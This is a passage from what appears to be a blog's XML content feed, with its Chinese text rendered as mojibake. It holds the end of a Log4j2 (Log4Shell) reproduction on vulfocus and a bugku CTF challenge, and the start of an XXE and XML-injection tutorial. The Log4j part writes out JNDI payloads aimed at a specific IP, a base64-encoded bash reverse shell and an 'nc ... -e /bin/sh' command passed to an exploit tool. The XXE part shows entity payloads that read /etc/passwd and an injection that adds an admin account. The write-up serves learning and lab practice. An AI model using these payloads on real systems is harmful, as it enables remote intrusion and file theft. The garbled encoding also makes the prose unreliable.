2ä¸­JNDIè§£ææœªä½œé™åˆ¶ï¼Œå¯ä»¥ç›´æ¥è®¿é—®åˆ°è¿œç¨‹å¯¹è±¡,å¦‚æœæ˜¯è‡ªå·±çš„æœåŠ¡å™¨è¿˜å¥½è¯´ï¼Œé‚£å¦‚æœè®¿é—®åˆ°é»‘å®¢çš„æœåŠ¡å™¨å‘¢ï¼Ÿ</p><p>ä¹Ÿå°±æ˜¯å½“è®°å½•æ—¥å¿—çš„ä¸€éƒ¨åˆ†æ˜¯ç”¨æˆ·å¯æ§æ—¶(æ¯”å¦‚è¾“å…¥ç”¨æˆ·åå’Œå¯†ç æ—¶)ï¼Œå°±å¯ä»¥æ„é€ æ¶æ„å­—ç¬¦ä¸²ä½¿æœåŠ¡å™¨è®°å½•æ—¥å¿—æ—¶è°ƒç”¨JNDIè®¿é—®æ¶æ„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æµä¼ å‡ºçš„payloadæ„æˆï¼š</p><p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p><h1 id="å¤ç°æµç¨‹"><a href="#å¤ç°æµç¨‹" class="headerlink" title="å¤ç°æµç¨‹"></a>å¤ç°æµç¨‹</h1><p><strong>ç¯å¢ƒ1 å¤±è´¥</strong></p><p>ç¯å¢ƒ:<a href="http://vulfocus.io/">http://vulfocus.io/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225000889.png" alt="image-20220423225000889"></p><p>æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨log4j2,ä½¿ç”¨ç½‘ç«™:<a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230017138.png" alt="image-20220423230017138"></p><pre><code>xxxx?payload=$&#123;jndi:ldap://37zwcc.dnslog.cn/exp&#125;</code></pre><p>æœ‰ä¸ªå¾ˆé‡è¦ä¸€ç‚¹ï¼Œè¦å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œurlç¼–ç </p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225440706.png" alt="image-20220423225440706"></p><p>æˆåŠŸå›æ˜¾ï¼Œè¯æ˜æœ‰æ¼æ´</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230128737.png" alt="image-20220423230128737"></p><p>åœ¨vpsä¸Šè¿è¡Œjndiæ³¨å…¥å·¥å…·:</p><p>é“¾æ¥:<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230550825.png" alt="image-20220423230550825"></p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDguMTY2LjIwMS4xNi82NjY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;108.166.xx.xx&quot;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231525347.png" alt="image-20220423231525347"></p><p>ncç›‘å¬:</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231620210.png" alt="image-20220423231620210"></p><p>æ„é€ payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/xodh7q&#125;</code></pre><p>è¿˜æ˜¯è¿›è¡Œurlç¼–ç </p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000703924.png" alt="image-20220424000703924"></p><p>æŒ‰ç†è¯´å°±å¯ä»¥äº†ï¼Œä½†æ˜¯æˆ‘åœ¨è¿™ä¸ªç¯å¢ƒå¹¶æ²¡æœ‰æˆåŠŸ</p><p><strong>ç¯å¢ƒ2 æˆåŠŸ</strong></p><p>æ„Ÿè§‰ä¸Šé¢çš„ç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œä¸€ç›´æ— æ³•åå¼¹shellï¼Œæ— è®ºæ˜¯bin/bash è¿˜æ˜¯ncéƒ½åå¼¹å¤±è´¥äº†ï¼Œä¸‹é¢é‡‡ç”¨bugkuç¯å¢ƒå¤ç°</p><p>url:<a href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000909413.png" alt="image-20220424000909413"></p><p>æ‰“ä¸€ä¸‹pocï¼Œæµ‹è¯•ä¸‹æ˜¯å¦å­˜åœ¨æ¼æ´</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001013346.png" alt="image-20220424001013346"></p><p>ojbkï¼Œå›æ˜¾äº†</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001036572.png" alt="image-20220424001036572"></p><p>åœ¨Linuxä¸Šå¯åŠ¨æœåŠ¡</p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc 108.166.xx.xx 4444 -e /bin/sh&quot; -A 108.166.xx.xx</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001128315.png" alt="image-20220424001128315"></p><p>ç›´æ¥æ„é€ payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/dwqsay&#125;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000441276.png" alt="image-20220424000441276"></p><p>æˆåŠŸåå¼¹shell</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000428361.png" alt="image-20220424000428361"></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> log4j2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXEæ¼æ´å­¦ä¹ </title>
      <link href="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>è‡ªå·±å¯¹è¿™ä¸ªæ¼æ´ä¸æ‡‚åŸç†ï¼Œä»¥åŠä¸ä¼šæ·±å…¥åˆ©ç”¨ï¼Œå°±çœ‹çœ‹å¸ˆå‚…çš„æ–‡ç« ï¼Œæ¬è¿é¡ºä¾¿å¤ç°éƒ¨åˆ†åœºæ™¯å§ã€‚</p><p>[TOC]</p><h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p><strong>ä»€ä¹ˆæ˜¯XML</strong></p><p> XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚<br> XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ã€‚<br> XML æ˜¯ W3C çš„æ¨èæ ‡å‡†ã€‚<br> XML ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ã€‚<br> XML è¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾ã€‚</p><p><strong>XMLå’ŒHTMLçš„åŒºåˆ«</strong></p><p> XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚<br> HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚<br> HTML æ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚</p><p><strong>XMLè¢«ç”¨æ¥åšä»€ä¹ˆ</strong></p><p>ç°å®ç”Ÿæ´»ä¸­ä¸€äº›æ•°æ®ä¹‹é—´å¾€å¾€å­˜åœ¨ä¸€å®šçš„å…³ç³»ã€‚æˆ‘ä»¬å¸Œæœ›èƒ½åœ¨è®¡ç®—æœºä¸­ä¿å­˜å’Œå¤„ç†è¿™äº›æ•°æ®çš„åŒæ—¶èƒ½å¤Ÿä¿å­˜å’Œå¤„ç†ä»–ä»¬ä¹‹é—´çš„å…³ç³»ã€‚XMLå°±æ˜¯ä¸ºäº†è§£å†³è¿™æ ·çš„éœ€æ±‚è€Œäº§ç”Ÿæ•°æ®å­˜å‚¨æ ¼å¼ã€‚</p><p><strong>XMLåŸºæœ¬æ ¼å¼</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xmlæ–‡ä»¶çš„å£°æ˜--&gt;&lt;bookstore&gt;                                                 &lt;!--æ ¹å…ƒç´ --&gt;&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstoreçš„å­å…ƒç´ ï¼Œcategoryä¸ºå±æ€§--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--bookçš„å­å…ƒç´ ï¼Œlangä¸ºå±æ€§--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--bookçš„å­å…ƒç´ --&gt;&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--bookçš„å­å…ƒç´ --&gt;&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--bookçš„å­å…ƒç´ --&gt;&lt;/book&gt;                                                 &lt;!--bookçš„ç»“æŸ--&gt;&lt;/bookstore&gt;                                       &lt;!--bookstoreçš„ç»“æŸ--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; ç§°ä¸º XML prolog ï¼Œç”¨äºå£°æ˜XMLæ–‡æ¡£çš„ç‰ˆæœ¬å’Œç¼–ç ï¼Œæ˜¯å¯é€‰çš„ï¼Œå¿…é¡»æ”¾åœ¨æ–‡æ¡£å¼€å¤´ã€‚standaloneå€¼æ˜¯yesçš„æ—¶å€™è¡¨ç¤ºDTDä»…ç”¨äºéªŒè¯æ–‡æ¡£ç»“æ„ï¼Œä»è€Œå¤–éƒ¨å®ä½“å°†è¢«ç¦ç”¨ï¼Œä½†å®ƒçš„é»˜è®¤å€¼æ˜¯noï¼Œè€Œä¸”æœ‰äº›parserä¼šç›´æ¥å¿½ç•¥è¿™ä¸€é¡¹ã€‚</code></pre><p><strong>åŸºæœ¬è¯­æ³•</strong></p><ul><li>æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾ã€‚</li><li>XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿã€‚</li><li>XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—ã€‚</li><li>XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ ã€‚</li><li>XML çš„å±æ€§å€¼é¡»åŠ å¼•å·ã€‚</li></ul><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p><strong>åŸºæœ¬æ¦‚å¿µ</strong></p><p> XML æ–‡æ¡£æœ‰è‡ªå·±çš„ä¸€ä¸ªæ ¼å¼è§„èŒƒï¼Œè¿™ä¸ªæ ¼å¼è§„èŒƒæ˜¯ç”±ä¸€ä¸ªå«åš DTDï¼ˆdocument type definitionï¼‰ çš„ä¸œè¥¿æ§åˆ¶çš„ã€‚<br> DTDç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨å¦å¤–ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ã€‚æ˜¯XMLæ–‡æ¡£ä¸­çš„å‡ æ¡è¯­å¥ï¼Œç”¨æ¥è¯´æ˜å“ªäº›å…ƒç´ /å±æ€§æ˜¯åˆæ³•çš„ä»¥åŠå…ƒç´ é—´åº”å½“æ€æ ·åµŒå¥—/ç»“åˆï¼Œä¹Ÿç”¨æ¥å°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦å’Œå¯å¤ç”¨ä»£ç æ®µè‡ªå®šä¹‰ä¸ºå®ä½“ã€‚</p><p><strong>å®ä½“å¼•ç”¨</strong></p><pre><code class="xml">XMLå…ƒç´ ä»¥å½¢å¦‚ &lt;tag&gt;foo&lt;/tag&gt; çš„æ ‡ç­¾å¼€å§‹å’Œç»“æŸï¼Œå¦‚æœå…ƒç´ å†…éƒ¨å‡ºç°å¦‚&lt; çš„ç‰¹æ®Šå­—ç¬¦ï¼Œè§£æå°±ä¼šå¤±è´¥ï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼ŒXMLç”¨å®ä½“å¼•ç”¨ï¼ˆentity referenceï¼‰æ›¿æ¢ç‰¹æ®Šå­—ç¬¦ã€‚XMLé¢„å®šä¹‰äº”ä¸ªå®ä½“å¼•ç”¨ï¼Œå³ç”¨&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; æ›¿æ¢ &lt; &gt; &amp; &#39; &quot; ã€‚å®ä½“å¼•ç”¨å¯ä»¥èµ·åˆ°ç±»ä¼¼å®å®šä¹‰å’Œæ–‡ä»¶åŒ…å«çš„æ•ˆæœï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›è‡ªå®šä¹‰å®ä½“å¼•ç”¨ï¼Œè¿™ä¸ªæ“ä½œåœ¨ç§°ä¸º Document Type Definationï¼ˆDTDï¼Œæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„è¿‡ç¨‹ä¸­è¿›è¡Œã€‚</code></pre><p><strong>ç¤ºä¾‹ä»£ç </strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;PCDATAPCDATAçš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ã€‚PCDATAæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚è¢«è§£æçš„å­—ç¬¦æ•°æ®ä¸åº”å½“åŒ…å«ä»»ä½•&amp;ï¼Œ&lt;ï¼Œæˆ–è€…&gt;å­—ç¬¦ï¼Œéœ€è¦ç”¨&amp;amp; &amp;lt; &amp;gt;å®ä½“æ¥åˆ†åˆ«æ›¿æ¢ã€‚CDATACDATAæ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ŒCDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ï¼Œåœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€</code></pre><p><strong>DTDå…ƒç´ </strong></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150727-65e7882a-14d2-1.png" alt="img"></p><h1 id="DTDå®ä½“"><a href="#DTDå®ä½“" class="headerlink" title="DTDå®ä½“"></a>DTDå®ä½“</h1><blockquote><p> å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚<br> å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚<br> å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</p></blockquote><p><em>æŒ‰å®ä½“æœ‰æ— å‚åˆ†ç±»ï¼Œå®ä½“åˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“</em></p><pre><code class="xml">ä¸€èˆ¬å®ä½“çš„å£°æ˜ï¼š&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;å¼•ç”¨ä¸€èˆ¬å®ä½“çš„æ–¹æ³•ï¼š&amp;å®ä½“åç§°;ç»å®éªŒï¼Œæ™®é€šå®ä½“å¯ä»¥åœ¨DTDä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨XMLä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨å£°æ˜å‰å¼•ç”¨ï¼Œè¿˜å¯ä»¥åœ¨å®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚å‚æ•°å®ä½“çš„å£°æ˜ï¼š&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;å¼•ç”¨å‚æ•°å®ä½“çš„æ–¹æ³•ï¼š%å®ä½“åç§°;ç»å®éªŒï¼Œå‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­å¼•ç”¨ï¼Œä¸èƒ½åœ¨å£°æ˜å‰å¼•ç”¨ï¼Œä¹Ÿä¸èƒ½åœ¨å®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚</code></pre><p>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p><p>æŒ‰å®ä½“ä½¿ç”¨æ–¹å¼åˆ†ç±»ï¼Œå®ä½“åˆ†ä¸ºå†…éƒ¨å£°æ˜å®ä½“å’Œå¼•ç”¨å¤–éƒ¨å®ä½“</p><p><strong>å†…éƒ¨å®ä½“</strong></p><pre><code class="xml">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code></pre><p><strong>å†…éƒ¨å®ä½“ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;Â©right;&lt;/test&gt;</code></pre><p><strong>å¤–éƒ¨å®ä½“</strong></p><p>å¤–éƒ¨å®ä½“ï¼Œç”¨æ¥å¼•å…¥å¤–éƒ¨èµ„æºã€‚æœ‰<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœºã€‚</p><pre><code class="xml">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;æˆ–è€…&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre><p><strong>å¤–éƒ¨å®ä½“ç¤ºä¾‹ä»£ç :</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;Â©right;&lt;/author&gt;</code></pre><p>å¤–éƒ¨å®ä½“å¯æ”¯æŒhttpã€fileç­‰åè®®ã€‚ä¸åŒç¨‹åºæ”¯æŒçš„åè®®ä¸åŒï¼š</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150935-b26e4a30-14d2-1.png" alt="img"></p><p> PHPæ”¯æŒçš„åè®®ä¼šæ›´å¤šä¸€äº›ï¼Œä½†éœ€è¦ä¸€å®šçš„æ‰©å±•ï¼š</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202151023-cf02c3ba-14d2-1.png" alt="img"></p><p><strong>PHPå¼•ç”¨å¤–éƒ¨å®ä½“ï¼Œå¸¸è§çš„åˆ©ç”¨åè®®</strong>ï¼š</p><pre><code class="xml">file://æ–‡ä»¶ç»å¯¹è·¯å¾„ å¦‚ï¼šfile:///etc/passwdhttp://url/file.txtphp://filter/read=convert.base64-encode/resource=xxx.php</code></pre><p><strong>å‚æ•°å®ä½“+å¤–éƒ¨å®ä½“</strong></p><pre><code class="xml">&lt;!ENTITY % å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;</code></pre><p>ç¤ºä¾‹ä»£ç ï¼š</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  %file;]&gt;%file(å‚æ•°å®ä½“)æ˜¯åœ¨DTDä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ&amp;file;æ˜¯åœ¨xmlæ–‡æ¡£ä¸­è¢«å¼•ç”¨çš„ã€‚</code></pre><h1 id="XMLæ³¨å…¥"><a href="#XMLæ³¨å…¥" class="headerlink" title="XMLæ³¨å…¥"></a>XMLæ³¨å…¥</h1><blockquote><p> XMLçš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œéæ˜¾ç¤ºæ•°æ®ã€‚<br> XMLæ³¨å…¥æ˜¯ä¸€ç§å¤è€çš„æŠ€æœ¯ï¼Œé€šè¿‡åˆ©ç”¨é—­åˆæ ‡ç­¾æ”¹å†™XMLæ–‡ä»¶å®ç°çš„ã€‚</p></blockquote><p><strong>XMLæ³¨å…¥ç®€ä»‹</strong></p><p> XMLæ˜¯ä¸€ç§æ•°æ®ç»„ç»‡å­˜å‚¨çš„æ•°æ®ç»“æ„æ–¹å¼ï¼Œå®‰å…¨çš„XMLåœ¨ç”¨æˆ·è¾“å…¥ç”Ÿæˆæ–°çš„æ•°æ®æ—¶å€™åº”è¯¥åªèƒ½å…è®¸ç”¨æˆ·æ¥å—çš„æ•°æ®ï¼Œéœ€è¦è¿‡æ»¤æ‰ä¸€äº›å¯ä»¥æ”¹å˜XMLæ ‡ç­¾ä¹Ÿå°±æ˜¯è¯´æ”¹å˜XMLç»“æ„æ’å…¥æ–°åŠŸèƒ½ï¼ˆä¾‹å¦‚æ–°çš„è´¦æˆ·ä¿¡æ¯ï¼Œç­‰äºæ·»åŠ äº†è´¦æˆ·ï¼‰çš„ç‰¹æ®Šè¾“å…¥ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤ï¼Œåˆ™å¯ä»¥å¯¼è‡´XMLæ³¨å…¥æ”»å‡»ã€‚</p><p><strong>XMLæ³¨å…¥å‰æ</strong></p><p> ï¼ˆ1ï¼‰ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶æ•°æ®çš„è¾“å…¥<br> ï¼ˆ2ï¼‰ç¨‹åºæœ‰æ‹¼å‡‘çš„æ•°æ®</p><p><strong>æ¡ˆä¾‹æ¼”ç¤º</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;username&gt;admin&lt;/username&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>å¯¹äºä¸Šé¢çš„xmlæ–‡ä»¶ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤ŸæŒæ§passwordå­—æ®µï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”ŸXMLæ³¨å…¥ã€‚å¦‚æ”»å‡»è€…è¾“å…¥ï¼š</p><pre><code class="xml">root&lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;username&gt;hack&lt;/username&gt;&lt;password&gt;hacker    # åœ¨åŸæ–‡ä¸­ç»™å‡ºçš„æ˜¯ admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;ï¼Œæˆ‘è§‰å¾—è¿™æ ·ä¸å¯¹ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘æƒ³é”™äº†ï¼Œå…ˆå¡«å‘å§</code></pre><p>é‚£ä¹ˆä¸Šè¿°ä»£ç å°±ä¼šå˜ä¸º</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;name&gt;admin&lt;/name&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;3&quot;&gt;    &lt;name&gt;hack&lt;/name&gt;    &lt;password&gt;hacker&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>è¿™æ ·å°±é€šè¿‡XMLæ³¨å…¥æ·»åŠ äº†ä¸€ä¸ªåä¸ºhackã€å¯†ç ä¸ºï¼šhackerçš„ç®¡ç†å‘˜è´¦æˆ·ã€‚<br> XMLæ³¨å…¥ä¸¤å¤§è¦ç´ ï¼š<strong>æ ‡ç­¾é—­åˆå’Œè·å–XMLè¡¨ç»“æ„</strong></p><p><strong>XMLæ³¨å…¥é˜²å¾¡</strong></p><p> ï¼ˆ1ï¼‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤<br> ï¼ˆ2ï¼‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè½¬ä¹‰</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152614-05da2f0c-14d5-1.jpg" alt="img"></p><h1 id="XPathæ³¨å…¥"><a href="#XPathæ³¨å…¥" class="headerlink" title="XPathæ³¨å…¥"></a>XPathæ³¨å…¥</h1><p><strong>Xpathæ³¨å…¥ç®€ä»‹</strong></p><p>XPathæ³¨å…¥æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨XPath è§£æå™¨çš„æ¾æ•£è¾“å…¥å’Œå®¹é”™ç‰¹æ€§ï¼Œèƒ½å¤Ÿåœ¨ URLã€è¡¨å•æˆ–å…¶å®ƒä¿¡æ¯ä¸Šé™„å¸¦æ¶æ„çš„XPath  æŸ¥è¯¢ä»£ç 